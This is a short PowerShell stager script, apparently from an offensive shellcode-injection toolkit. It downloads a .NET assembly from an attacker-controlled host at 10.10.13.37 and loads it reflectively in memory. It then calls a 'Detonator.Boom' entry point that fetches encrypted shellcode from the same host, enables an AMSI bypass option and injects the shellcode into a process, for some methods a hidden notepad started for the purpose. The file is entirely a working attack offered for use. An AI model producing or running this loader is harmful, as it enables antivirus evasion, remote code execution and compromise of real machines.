# MODULE
$M = "currentthread"

# LHOST
$H = "10.10.13.37"

# AMSI
$A = "true"

# DLL
$D = "DInjector.dll"

# SHELLCODE
$S = "enc"

# PASSWORD
$P = "Passw0rd!"

# PROCESS
$N = "notepad"

# IMAGE
$I = "C:\Windows\System32\svchost.exe"

# --------------------------------------------------------------------

$methods = @("remotethread", "remotethreadsuspended")
if ($methods.Contains($M)) {
    $N = (Start-Process -WindowStyle Hidden -PassThru $N).Id
}

$cmd = "$M /am51:$A /sc:http://$H/$S /password:$P /pid:$N /image:$I"

$data = (IWR -UseBasicParsing "http://$H/$D").Content
$assem = [System.Reflection.Assembly]::Load($data)

$flags = [Reflection.BindingFlags] "NonPublic,Static"

$class = $assem.GetType("DInjector.Detonator", $flags)
$entry = $class.GetMethod("Boom", $flags)

$entry.Invoke($null, (, $cmd.Split(" ")))
